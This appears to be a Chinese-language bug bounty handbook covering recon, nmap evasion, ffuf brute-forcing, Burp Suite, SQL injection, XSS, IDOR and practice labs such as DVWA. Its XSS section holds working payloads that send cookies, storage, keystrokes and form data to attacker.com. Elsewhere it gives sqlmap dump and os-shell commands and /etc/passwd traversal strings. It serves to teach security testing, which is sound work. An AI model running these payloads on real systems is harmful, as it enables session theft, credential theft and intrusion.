# Bug Bounty Course 2024 

## 目錄

本筆記將Ryan John的Bug Bounty Course 2024影片內容，結合最新的學術研究和實務指南，製作成一份完整的技術學習手冊。每個步驟都會詳細說明，讓完全沒有基礎的初學者也能理解並實際操作。

## 第一部分：Bug Bounty基礎概念與環境準備

### 1.1 什麼是Bug Bounty？

Bug Bounty（漏洞賞金獵人）是一種合法的網路安全活動，公司或組織提供獎勵給發現並報告其系統安全漏洞的研究人員。這不是駭客行為，而是一種**建設性的安全測試**。

**核心概念：**

- **白帽駭客**：使用駭客技術但目的是改善安全性
- **責任揭露**：發現漏洞後負責任地報告給廠商
- **合法授權**：只在獲得明確許可的系統上進行測試
- **商業模式**：透過發現漏洞獲得合法報酬

**Bug Bounty生態系統：**

1. **研究人員**：尋找漏洞的安全專家（就是你！）
2. **目標公司**：希望改善安全性的組織
3. **平台**：連接研究人員和公司的中介平台
4. **社群**：分享知識和經驗的安全社群

### 1.2 主要Bug Bounty平台詳解

**HackerOne**：

- 全球最大的Bug Bounty平台
- 超過4000個活躍程序
- 平均獎勵範圍：\$100-\$50,000
- 適合所有級別的研究人員
- 提供詳細的漏洞分類和報告模板

**Bugcrowd**：

- 第二大Bug Bounty平台
- 專注於企業級客戶
- 提供專業的協調服務
- 平均獎勵較HackerOne略高
- 有嚴格的研究人員審核制度

**Intigriti**：

- 歐洲領先的平台
- 私人邀請制，競爭較小
- 注重品質而非數量
- 提供優秀的技術支援


### 1.3 學習環境設置

**虛擬機器設置**：

1. **下載虛擬化軟體**：
    - VMware Workstation Pro（推薦）
    - VirtualBox（免費選項）
    - Parallels Desktop（Mac用戶）
2. **下載Kali Linux**：

```bash
# 官方下載連結
https://www.kali.org/get-kali/
# 選擇VMware或VirtualBox版本
# 建議下載64位版本
```

3. **系統配置**：

```bash
# 更新系統
sudo apt update && sudo apt upgrade -y

# 安裝額外工具
sudo apt install -y curl wget git vim htop

# 設定時區
sudo timedatectl set-timezone Asia/Taipei
```


**基本工具安裝**：

```bash
# 確認預裝工具
nmap --version
burpsuite --version
ffuf --version

# 安裝額外工具
sudo apt install -y gobuster nikto dirb sqlmap
pip3 install subfinder
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```


## 第二部分：偵察技術詳解

### 2.1 偵察基礎理論

偵察（Reconnaissance）是Bug Bounty的核心技能，佔整個測試過程的70-80%時間。好的偵察能幫你發現其他人錯過的攻擊面。

**偵察類型分析：**

**被動偵察**：

- **定義**：不直接接觸目標系統，使用公開資訊
- **優點**：完全隱蔽，不會被發現
- **缺點**：資訊可能過時或不完整
- **工具**：Google搜尋、Shodan、證書透明度日誌

**主動偵察**：

- **定義**：直接與目標系統互動獲取資訊
- **優點**：資訊準確、即時
- **缺點**：可能被記錄或封鎖
- **工具**：Nmap、ping、traceroute


### 2.2 子域名枚舉技術詳解

子域名枚舉是發現更多攻擊面的關鍵技術。[^13][^14][^15][^16]

**2.2.1 Subfinder使用詳解**：

```bash
# 基本用法
subfinder -d target.com

# 輸出到檔案
subfinder -d target.com -o subdomains.txt

# 使用多個域名
subfinder -dL domains.txt -o all_subdomains.txt

# 只顯示解析成功的子域名
subfinder -d target.com -nW

# 使用所有被動來源
subfinder -d target.com -all

# 設定API密鑰（提高發現率）
subfinder -d target.com -config ~/.config/subfinder/config.yaml
```

**配置API密鑰**：

```yaml
# ~/.config/subfinder/config.yaml
version: 2
sources:
  - virustotal
  - shodan
  - censys
  - fofa
  - spyse
  - github
  - chaos

# API密鑰配置
virustotal:
  - "your-virustotal-api-key"
shodan:
  - "your-shodan-api-key"
github:
  - "your-github-token"
```

**2.2.2 Amass進階使用**：

```bash
# 基本枚舉
amass enum -d target.com

# 被動枚舉（推薦）
amass enum -passive -d target.com -o amass_passive.txt

# 主動枚舉（需謹慎）
amass enum -active -d target.com -o amass_active.txt

# 使用字典暴力破解
amass enum -d target.com -brute -w /usr/share/wordlists/subdomains.txt

# 詳細輸出
amass enum -d target.com -v

# 設定DNS伺服器
amass enum -d target.com -r 8.8.8.8,1.1.1.1

# 輸出為JSON格式
amass enum -d target.com -json amass_output.json
```

**2.2.3 多工具組合策略**：

```bash
#!/bin/bash
# 子域名枚舉腳本
TARGET=$1

echo "[+] 開始對 $TARGET 進行子域名枚舉"

# 使用Subfinder
echo "[+] 運行Subfinder..."
subfinder -d $TARGET -o subfinder_$TARGET.txt

# 使用Amass
echo "[+] 運行Amass..."
amass enum -passive -d $TARGET -o amass_$TARGET.txt

# 使用Assetfinder
echo "[+] 運行Assetfinder..."
assetfinder $TARGET > assetfinder_$TARGET.txt

# 合併並去重
echo "[+] 合併結果..."
cat subfinder_$TARGET.txt amass_$TARGET.txt assetfinder_$TARGET.txt | sort -u > all_subdomains_$TARGET.txt

# 檢查存活
echo "[+] 檢查存活子域名..."
httpx -l all_subdomains_$TARGET.txt -o live_subdomains_$TARGET.txt

echo "[+] 完成！發現 $(wc -l < live_subdomains_$TARGET.txt) 個存活子域名"
```


### 2.3 Nmap掃描技術深入解析

**2.3.1 基本掃描技術**：

```bash
# 基本掃描（掃描最常見的1000個端口）
nmap target.com

# 掃描所有端口
nmap -p- target.com

# 快速掃描（100個最常見端口）
nmap -F target.com

# 掃描特定端口
nmap -p 80,443,22,21,25 target.com

# 掃描端口範圍
nmap -p 1-1000 target.com

# 掃描前N個最常見端口
nmap --top-ports 1000 target.com
```

**2.3.2 隱蔽掃描技術**：

```bash
# SYN掃描（半開連接，預設掃描方式）
nmap -sS target.com

# 分片封包（躲避防火牆）
nmap -f target.com

# 使用誘餌IP（混淆真實來源）
nmap -D 10.0.0.2,10.0.0.3,ME target.com

# 隨機誘餌IP
nmap -D RND:10 target.com

# 時序控制（T1最慢，T5最快）
nmap -T1 target.com  # 極慢，適合躲避偵測
nmap -T2 target.com  # 慢
nmap -T3 target.com  # 正常（預設）
nmap -T4 target.com  # 快
nmap -T5 target.com  # 極快

# 隨機化端口掃描順序
nmap --randomize-hosts target1.com target2.com

# 設定自定義封包間隔
nmap --scan-delay 1s target.com
```

**2.3.3 服務版本偵測**：

```bash
# 基本版本偵測
nmap -sV target.com

# 版本偵測強度（0-9，9最強）
nmap -sV --version-intensity 9 target.com

# 作業系統偵測
nmap -O target.com

# 組合掃描
nmap -sV -O -sC target.com

# 積極掃描（包含版本、作業系統、腳本掃描）
nmap -A target.com

# 使用特定NSE腳本
nmap --script vuln target.com
nmap --script "http-*" target.com
nmap --script "ssl-*" target.com
```

**2.3.4 NSE腳本使用**：

```bash
# 查看可用腳本
nmap --script-help all

# 查看特定類別腳本
ls /usr/share/nmap/scripts/ | grep http

# 漏洞掃描
nmap --script vulners target.com
nmap --script vulscan target.com

# HTTP枚舉
nmap --script http-enum target.com
nmap --script http-methods target.com
nmap --script http-headers target.com

# SSL/TLS測試
nmap --script ssl-cert target.com
nmap --script ssl-enum-ciphers target.com

# SMB枚舉（Windows系統）
nmap --script smb-enum-shares target.com
nmap --script smb-enum-users target.com

# 自定義腳本參數
nmap --script http-enum --script-args http-enum.basepath='/admin/' target.com
```


### 2.4 Shodan使用詳解

Shodan是網路設備搜索引擎，可以找到連接到網際網路的任何設備。

**基本使用**：

```bash
# 初始化Shodan CLI
shodan init YOUR_API_KEY

# 基本搜索
shodan search apache

# 搜索特定組織
shodan search org:"Target Company"

# 搜索特定國家
shodan search country:TW

# 搜索特定端口
shodan search port:22

# 組合搜索
shodan search "nginx 1.14" country:US

# 統計結果數量
shodan count "apache 2.4"

# 下載搜索結果
shodan download apache_servers apache

# 解析下載的結果
shodan parse --fields ip_str,port,org apache_servers.json.gz
```

**進階搜索語法**：

```bash
# 搜索特定產品和版本
product:"Apache httpd" version:"2.4.41"

# 搜索漏洞
vuln:CVE-2021-44228

# 搜索特定網段
net:192.168.1.0/24

# 搜索特定城市
city:"Taipei"

# 搜索SSL憑證
ssl:"*.target.com"

# 搜索HTTP標題
http.title:"Welcome"

# 搜索HTTP狀態碼
http.status:200

# 排除特定結果
apache -nginx
```


## 第三部分：Web應用程式模糊測試（Fuzzing）

### 3.1 ffuf完全使用指南

ffuf（Fuzz Faster U Fool）是最快的Web模糊測試工具之一。

**3.1.1 基本目錄/檔案發現**：

```bash
# 基本目錄模糊測試
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 模糊測試檔案擴展名
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.js

# 模糊測試子目錄
ffuf -u http://target.com/admin/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 遞歸模糊測試
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion -recursion-depth 2

# 限制遞歸的最大時間
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion -maxtime-job 60
```

**3.1.2 高級過濾技術**：

```bash
# 過濾HTTP狀態碼
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404,403

# 只顯示特定狀態碼
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302

# 過濾回應大小
ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234

# 過濾包含特定字串的回應
ffuf -u http://target.com/FUZZ -w wordlist.txt -fr "Not Found"

# 過濾回應行數
ffuf -u http://target.com/FUZZ -w wordlist.txt -fl 50

# 組合過濾條件
ffuf -u http://target.com/FUZZ -w wordlist.txt -fc 404 -fs 0 -fw 1
```

**3.1.3 POST參數模糊測試**：

```bash
# POST數據模糊測試
ffuf -u http://target.com/login.php -X POST -d "username=admin&password=FUZZ" -w passwords.txt -fc 401

# JSON格式POST
ffuf -u http://target.com/api/login -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"FUZZ"}' -w passwords.txt

# 多參數模糊測試
ffuf -u http://target.com/search.php -X POST -d "search=FUZZ&category=W2" -w wordlist1.txt:FUZZ -w wordlist2.txt:W2

# Cookie模糊測試
ffuf -u http://target.com/FUZZ -w wordlist.txt -H "Cookie: sessionid=abc123; csrftoken=FUZZ2" -w csrf_tokens.txt:FUZZ2
```

**3.1.4 速度控制和隱蔽性**：

```bash
# 控制並發數（預設40）
ffuf -u http://target.com/FUZZ -w wordlist.txt -t 10

# 添加延遲（每個請求間隔）
ffuf -u http://target.com/FUZZ -w wordlist.txt -p 1

# 設定超時時間
ffuf -u http://target.com/FUZZ -w wordlist.txt -timeout 30

# 限制總執行時間
ffuf -u http://target.com/FUZZ -w wordlist.txt -maxtime 300

# 使用代理
ffuf -u http://target.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080

# 自定義User-Agent
ffuf -u http://target.com/FUZZ -w wordlist.txt -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)"
```

**3.1.5 輸出和報告**：

```bash
# 輸出為JSON格式
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.json -of json

# 輸出為HTML報告
ffuf -u http://target.com/FUZZ -w wordlist.txt -o results.html -of html

# 詳細輸出
ffuf -u http://target.com/FUZZ -w wordlist.txt -v

# 靜默模式（只顯示結果）
ffuf -u http://target.com/FUZZ -w wordlist.txt -s
```


### 3.2 自定義字典檔案

**常用字典資源**：

```bash
# SecLists（最全面的字典集合）
git clone https://github.com/danielmiessler/SecLists.git

# 常用目錄字典
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
SecLists/Discovery/Web-Content/directory-list-2.3-big.txt

# 檔案字典
SecLists/Discovery/Web-Content/web-extensions.txt
SecLists/Discovery/Web-Content/common.txt

# 參數字典
SecLists/Discovery/Web-Content/burp-parameter-names.txt
```

**創建自定義字典**：

```bash
#!/bin/bash
# 從目標網站提取字典

# 從robots.txt提取路徑
curl -s http://target.com/robots.txt | grep -E '^(Disallow|Allow):' | cut -d':' -f2 | sort -u > robots_paths.txt

# 從sitemap.xml提取路徑
curl -s http://target.com/sitemap.xml | grep -oE '<loc>[^<]+</loc>' | sed 's/<loc>//g;s/<\/loc>//g' > sitemap_urls.txt

# 從源代碼中提取路徑
curl -s http://target.com | grep -oE 'href="[^"]+"' | cut -d'"' -f2 > source_paths.txt

# 合併所有路徑
cat robots_paths.txt sitemap_urls.txt source_paths.txt | sort -u > custom_wordlist.txt
```


## 第四部分：Burp Suite完全操作指南

### 4.1 Burp Suite安裝與配置

**4.1.1 下載和安裝**：

1. **官方下載**：

```
https://portswigger.net/burp/communitydownload
```

2. **Linux安裝**：

```bash
# 下載後賦予執行權限
chmod +x burpsuite_community_linux.sh

# 執行安裝
./burpsuite_community_linux.sh

# 或直接運行JAR檔案
java -jar -Xmx2g burpsuite_community.jar
```

3. **記憶體設定**：

```bash
# 設定更大的記憶體
java -jar -Xmx4g burpsuite_community.jar
```


**4.1.2 代理設定詳解**：

1. **Burp代理設定**：
    - 打開Burp Suite
    - 進入`Proxy > Options`
    - 確認`Interface`設定為`127.0.0.1:8080`
    - 如果端口被占用，改為`8081`或其他端口
2. **瀏覽器設定**：

**Firefox手動設定**：

```
設定 > 網路設定 > 手動代理設定
HTTP代理：127.0.0.1  端口：8080
勾選「將此代理用於所有協定」
```

**Chrome使用FoxyProxy**：
    - 安裝FoxyProxy擴展
    - 新增代理：127.0.0.1:8080
    - 設定為HTTP和HTTPS
3. **SSL憑證安裝**：

```
1. 瀏覽器訪問：http://burp
2. 下載「CA Certificate」
3. Firefox：設定 > 隱私權與安全性 > 憑證 > 檢視憑證 > 匯入
4. Chrome：設定 > 進階 > 管理憑證 > 匯入
```


### 4.2 Burp Suite核心功能詳解

**4.2.1 Proxy模組**：

```
基本操作：
1. 開啟Intercept：Proxy > Intercept > Intercept is on
2. 瀏覽目標網站，請求會被攔截
3. 檢查請求內容
4. 點擊「Forward」發送請求
5. 查看HTTP History了解所有流量
```

**進階攔截規則**：

```
Proxy > Options > Intercept Client Requests
- 勾選「Intercept requests to in-scope targets only」
- 新增條件：「And URL Is in target scope」

Proxy > Options > Intercept Server Responses  
- 勾選「Intercept responses to in-scope targets only」
- 新增條件：「And status code matches」設定為「500」
```

**4.2.2 Target模組**：

```
範圍設定：
1. Target > Scope > Include in scope
2. 添加目標URL：^https?://target\.com.*$
3. 勾選「Proxy > Options > Intercept Client Requests > Intercept requests to in-scope targets only」

網站地圖分析：
- Target > Site map顯示所有訪問的URL
- 右鍵選單提供「Send to Repeater/Intruder/Scanner」
- Filter可以過濾特定類型的回應
```

**4.2.3 Repeater模組**：

```bash
基本操作：
1. 從Proxy History選擇請求
2. 右鍵「Send to Repeater」
3. 在Repeater中修改請求
4. 點擊「Send」查看回應
5. 比較不同請求的回應差異

常用修改：
- 改變HTTP方法（GET→POST）
- 修改參數值
- 添加/刪除HTTP標頭
- 測試不同的Payload
```

**4.2.4 Intruder模組**：

```bash
攻擊類型：
1. Sniper：單一位置，逐一替換
2. Battering ram：多個位置，使用相同payload
3. Pitchfork：多個位置，配對使用payload  
4. Cluster bomb：多個位置，所有組合

設定步驟：
1. Send to Intruder
2. Positions標籤：設定§payload位置§
3. Payloads標籤：選擇攻擊類型和payload清單
4. Options標籤：設定執行緒數和延遲
5. Start attack

實際應用：
- 暴力破解登入表單
- 目錄/檔案枚舉
- 參數模糊測試
- Session token分析
```

**4.2.5 Scanner模組**（Professional版限定）：

```bash
被動掃描：
- 自動分析HTTP流量
- 識別常見漏洞模式
- 不發送額外請求

主動掃描：
- 發送測試請求
- 檢測注入漏洞
- 測試存取控制
```


### 4.3 Burp Suite實戰技巧

**4.3.1 Session管理**：

```bash
# 提取session token
1. 登入目標應用程式
2. 在Proxy History找到登入請求
3. 記錄session相關cookie
4. 在後續請求中使用該cookie

# Session token分析
1. 收集多個session token
2. 使用Sequencer分析隨機性
3. 檢查是否存在可預測模式
```

**4.3.2 自定義擴展**：

```python
# 簡單的Burp擴展範例
from burp import IBurpExtender, IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Custom Logger")
        callbacks.registerHttpListener(self)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            request = messageInfo.getRequest()
            analyzedRequest = self._helpers.analyzeRequest(request)
            url = analyzedRequest.getUrl()
            print("Request to: " + str(url))
```


## 第五部分：常見漏洞深度分析

### 5.1 SQL注入漏洞詳解

SQL注入是OWASP Top 10第三名的嚴重漏洞。

**5.1.1 SQL注入基礎理論**：[^35][^36]

**漏洞原理**：
當應用程式將使用者輸入直接拼接到SQL查詢中，而不進行適當的驗證或過濾時，攻擊者可以注入惡意SQL代碼。

**示例**：

```sql
-- 正常查詢
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'

-- 注入後的查詢
SELECT * FROM users WHERE username = 'admin'--' AND password = ''
```

**5.1.2 手動SQL注入測試**：

**基礎檢測**：

```sql
# 基本字符測試
'
"
`
';--
";--
`);--

# 布爾盲注測試  
' OR '1'='1
' OR '1'='2
' AND '1'='1
' AND '1'='2

# 時間延遲測試
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
'; pg_sleep(5)--

# Union注入測試
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
```

**資料庫指紋識別**：

```sql
# MySQL
' AND 1=1#
' UNION SELECT version()#
' UNION SELECT @@version#

# PostgreSQL  
' AND 1=1--
' UNION SELECT version()--

# MSSQL
' AND 1=1--
' UNION SELECT @@version--

# Oracle
' AND '1'='1
' UNION SELECT banner FROM v$version--
```

**5.1.3 自動化SQL注入測試**：

**SQLMap使用**：

```bash
# 基本測試
sqlmap -u "http://target.com/page.php?id=1"

# 指定測試參數
sqlmap -u "http://target.com/page.php?id=1" -p id

# Cookie注入測試
sqlmap -u "http://target.com/page.php" --cookie="id=1"

# POST數據注入
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"

# 從Burp Suite請求文件測試
sqlmap -r request.txt

# 獲取資料庫名稱
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 獲取表格名稱
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 獲取欄位名稱
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# 導出數據
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# 獲取Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

**5.1.4 不同類型SQL注入**：

**Error-based注入**：

```sql
# 故意產生錯誤獲取資訊
' AND (SELECT COUNT(*) FROM information_schema.tables)--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND 1=CONVERT(int, @@version)--
```

**Boolean-based盲注**：

```sql
# 基於真/假判斷
' AND LENGTH(database())=8--
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))=97--
```

**Time-based盲注**：

```sql
# MySQL
' AND IF(LENGTH(database())=8, SLEEP(5), 0)--

# PostgreSQL
'; SELECT CASE WHEN LENGTH(current_database())=8 THEN pg_sleep(5) ELSE 0 END--

# MSSQL
'; IF (LEN(DB_NAME())=8) WAITFOR DELAY '00:00:05'--
```


### 5.2 跨站腳本攻擊（XSS）詳解

XSS是OWASP Top 10第七名漏洞。

**5.2.1 XSS類型分析**：

**反射型XSS（Reflected XSS）**：

```html
<!-- 易受攻擊的代碼 -->
<p>搜索結果：<?php echo $_GET['search']; ?></p>

<!-- 攻擊負載 -->
http://target.com/search.php?search=<script>alert('XSS')</script>
```

**儲存型XSS（Stored XSS）**：

```html
<!-- 留言板評論 -->
<script>
// 竊取Cookie
document.location='http://attacker.com/steal.php?cookie='+document.cookie;

// 竊取localStorage
var data = JSON.stringify(localStorage);
fetch('http://attacker.com/steal.php', {
    method: 'POST', 
    body: 'data=' + data
});
</script>
```

**DOM型XSS**：

```javascript
// 易受攻擊的代碼
document.getElementById('welcome').innerHTML = "Hello " + location.hash.substring(1);

// 攻擊URL
http://target.com/page.html#<script>alert('XSS')</script>
```

**5.2.2 XSS檢測技術**：[^40]

**基本Payload**：

```javascript
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
<body onload="alert('XSS')">
<div onmouseover="alert('XSS')">test</div>
```

**繞過過濾器**：

```javascript
# 大小寫混合
<ScRiPt>alert('XSS')</ScRiPt>

# 編碼繞過
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;

# HTML實體編碼
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;

# 雙重編碼
%253Cscript%253Ealert('XSS')%253C/script%253E

# 使用不同標籤
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">

# 事件處理程序
<div onclick="alert('XSS')">Click me</div>
<div onmouseover="alert('XSS')">Hover me</div>

# 無引號
<script>alert(String.fromCharCode(88,83,83))</script>

# 註釋繞過
<script>/*comment*/alert('XSS')</script>

# Base64編碼
<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>
```

**5.2.3 高級XSS利用技術**：

**Cookie竊取**：

```javascript
// 基本Cookie竊取
document.location='http://attacker.com/steal.php?cookie='+document.cookie;

// 使用fetch API
fetch('http://attacker.com/steal.php', {
    method: 'POST',
    body: 'cookies=' + encodeURIComponent(document.cookie)
});

// 使用XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://attacker.com/steal.php');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cookies=' + encodeURIComponent(document.cookie));
```

**會話劫持**：

```javascript
// 竊取sessionStorage
var session = JSON.stringify(sessionStorage);
fetch('http://attacker.com/steal.php', {
    method: 'POST', 
    body: 'session=' + session
});

// 竊取localStorage
var local = JSON.stringify(localStorage);
fetch('http://attacker.com/steal.php', {
    method: 'POST', 
    body: 'local=' + local
});
```

**鍵盤記錄**：

```javascript
// 鍵盤記錄器
document.addEventListener('keypress', function(e) {
    var key = String.fromCharCode(e.which);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/keylog.php');
    xhr.send('key=' + key);
});
```

**表單劫持**：

```javascript
// 劫持登入表單
document.forms[^0].addEventListener('submit', function(e) {
    var formData = new FormData(document.forms[^0]);
    var data = '';
    for (var pair of formData.entries()) {
        data += pair[^0] + '=' + pair[^1] + '&';
    }
    
    fetch('http://attacker.com/steal.php', {
        method: 'POST',
        body: data
    });
});
```


### 5.3 不安全直接物件參考（IDOR）深入分析

IDOR是存取控制漏洞的一種，允許攻擊者存取未經授權的物件。

**5.3.1 IDOR基本概念**：

**漏洞原理**：
應用程式使用使用者提供的輸入來直接存取物件，但沒有適當的存取控制檢查。

**常見場景**：

```
# 使用者檔案存取
http://example.com/user/profile?id=123
http://example.com/document/view?doc_id=456

# API端點
http://example.com/api/user/789/details
http://example.com/api/order/12345

# 直接檔案存取
http://example.com/uploads/invoice_001.pdf
http://example.com/images/user_123.jpg
```

**5.3.2 IDOR檢測方法**：

**手動測試步驟**：

```
1. 註冊多個測試帳戶
2. 使用第一個帳戶存取資源，記錄ID
3. 使用第二個帳戶，嘗試存取第一個帳戶的資源
4. 觀察是否能成功存取
```

**自動化檢測腳本**：

```python
import requests
import sys

def test_idor(base_url, start_id, end_id, session_cookie):
    """
    IDOR自動化測試腳本
    """
    vulnerable_ids = []
    
    for user_id in range(start_id, end_id + 1):
        url = f"{base_url}?id={user_id}"
        headers = {
            'Cookie': session_cookie,
            'User-Agent': 'Mozilla/5.0 (compatible; IDORTester/1.0)'
        }
        
        try:
            response = requests.get(url, headers=headers, timeout=10)
            
            # 檢查是否成功存取
            if response.status_code == 200:
                # 檢查是否包含其他使用者資料
                if 'email' in response.text and 'user' in response.text:
                    vulnerable_ids.append(user_id)
                    print(f"[+] 可能的IDOR漏洞：ID {user_id}")
                    
        except requests.RequestException as e:
            print(f"[-] 請求失敗 ID {user_id}: {e}")
    
    return vulnerable_ids

# 使用範例
if __name__ == "__main__":
    base_url = "http://target.com/profile"
    start_id = 1
    end_id = 1000
    session_cookie = "sessionid=abc123xyz"
    
    vulnerabilities = test_idor(base_url, start_id, end_id, session_cookie)
    print(f"\n總共發現 {len(vulnerabilities)} 個可能的IDOR漏洞")
```

**5.3.3 不同類型的IDOR**：

**數字型IDOR**：

```bash
# 順序遞增的ID
/user/1 → /user/2 → /user/3

# Burp Intruder設定
POST /api/user/§1§/profile
Payload type: Numbers
From: 1, To: 1000, Step: 1
```

**GUID/UUID型IDOR**：

```bash
# 看似隨機但可能可預測
/user/550e8400-e29b-41d4-a716-446655440000

# 如果UUID算法可預測，仍然可以枚舉
# 分析多個UUID，尋找模式
```

**檔案路徑IDOR**：

```bash
# 直接檔案路徑存取
/download/file1.pdf → /download/file2.pdf
/uploads/doc_123.docx → /uploads/doc_124.docx

# 目錄遍歷結合IDOR
/download/../../../etc/passwd
/files/..%2F..%2F..%2Fetc%2Fpasswd
```

**API端點IDOR**：

```bash
# RESTful API IDOR
GET /api/v1/users/123
PUT /api/v1/users/124
DELETE /api/v1/orders/456

# GraphQL IDOR
query {
  user(id: 123) {
    email
    profile
  }
}
```


## 第六部分：實戰環境搭建與練習

### 6.1 DVWA（Damn Vulnerable Web Application）設置

DVWA是最經典的練習平台。

**6.1.1 DVWA安裝（Kali Linux）**：

```bash
# 1. 更新系統並安裝依賴
sudo apt update && sudo apt upgrade -y
sudo apt install -y apache2 mariadb-server php php-mysqli php-gd

# 2. 啟動並設定服務
sudo systemctl start apache2
sudo systemctl start mariadb
sudo systemctl enable apache2
sudo systemctl enable mariadb

# 3. 保護MariaDB
sudo mysql_secure_installation
# 設定root密碼，移除匿名用戶，禁止root遠端登入

# 4. 下載DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo mv DVWA dvwa

# 5. 設定權限
sudo chown -R www-data:www-data /var/www/html/dvwa
sudo chmod -R 755 /var/www/html/dvwa

# 6. 配置資料庫
sudo mysql -u root -p
```

**資料庫設定**：

```sql
CREATE DATABASE dvwa;
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost' IDENTIFIED BY 'dvwa';
FLUSH PRIVILEGES;
EXIT;
```

**PHP配置調整**：

```bash
# 編輯PHP配置
sudo nano /etc/php/8.1/apache2/php.ini

# 修改以下設定
allow_url_include = On
allow_url_fopen = On
magic_quotes_gpc = Off
```

**DVWA配置**：

```bash
# 複製配置檔案
cd /var/www/html/dvwa/config
sudo cp config.inc.php.dist config.inc.php

# 編輯配置
sudo nano config.inc.php

# 修改資料庫設定
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'dvwa';
$_DVWA[ 'db_password' ] = 'dvwa';
```

**完成設定**：

```bash
# 重啟Apache
sudo systemctl restart apache2

# 訪問DVWA
http://localhost/dvwa/setup.php

# 點擊「Create / Reset Database」
# 預設登入：admin/password
```

**6.1.2 DVWA安全級別說明**：

```
Low：無安全防護，適合初學者
Medium：基本過濾，需要繞過技術
High：較強防護，需要進階技術
Impossible：最強防護，展示正確實作
```


### 6.2 OWASP Juice Shop設置

Juice Shop是最現代的練習平台。

**6.2.1 Docker安裝（推薦）**：

```bash
# 拉取並運行Juice Shop
docker pull bkimminich/juice-shop
docker run --rm -p 3000:3000 bkimminich/juice-shop

# 訪問應用程式
http://localhost:3000

# 在背景運行
docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
```

**6.2.2 Node.js安裝**：

```bash
# 安裝Node.js和npm
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# 克隆專案
git clone https://github.com/juice-shop/juice-shop.git
cd juice-shop

# 安裝依賴並啟動
npm install
npm start

# 訪問應用程式
http://localhost:3000
```

**6.2.3 自定義配置**：

```yaml
# config/default.yml範例配置
application:
  name: 'My Custom Juice Shop'
  welcomeBanner:
    showOnFirstStart: true
    title: 'Welcome to My Lab'
    message: 'This is a custom security testing environment'

products:
  - name: 'Custom Product'
    price: 10.99
    description: 'A test product'
    image: 'custom.jpg'
    urlForProductTamperingChallenge: 'custom-product'
```

**6.2.4 Juice Shop挑戰分類**：

```
注入類別：
- SQL Injection
- NoSQL Injection
- OS Command Injection

身份驗證缺陷：
- Broken Authentication
- JWT Issues
- Session Management

敏感資料暴露：
- Sensitive Data Exposure
- XXE (XML External Entities)

存取控制缺陷：
- Broken Access Control
- IDOR

安全配置錯誤：
- Security Misconfiguration
- Missing Function Level Access Control

XSS相關：
- Reflected XSS
- Stored XSS
- DOM XSS

不安全反序列化：
- Insecure Deserialization
- Object Injection

已知漏洞元件：
- Using Components with Known Vulnerabilities
- Vulnerable Libraries

記錄監控不足：
- Insufficient Logging & Monitoring
- Security Logging
```


### 6.3 其他練習環境

**6.3.1 WebGoat**：

```bash
# Docker安裝
docker pull webgoat/goatandwolf
docker run -p 8080:8080 -p 9090:9090 webgoat/goatandwolf

# 直接下載運行
wget https://github.com/WebGoat/WebGoat/releases/download/8.2.2/webgoat-server-8.2.2.jar
java -jar webgoat-server-8.2.2.jar

# 訪問
http://localhost:8080/WebGoat
```

**6.3.2 bWAPP（Buggy Web Application）**：

```bash
# 下載並解壓
wget http://www.itsecgames.com/bWAPP_latest.zip
unzip bWAPP_latest.zip -d /var/www/html/

# 配置資料庫（類似DVWA設定）
# 訪問 http://localhost/bWAPP/install.php
```

**6.3.3 Mutillidae**：

```bash
# 克隆專案
git clone https://github.com/webpwnized/mutillidae.git /var/www/html/mutillidae

# 設定資料庫和權限
# 訪問 http://localhost/mutillidae
```


## 第七部分：Metasploit Framework基礎

### 7.1 Metasploit安裝與基本配置

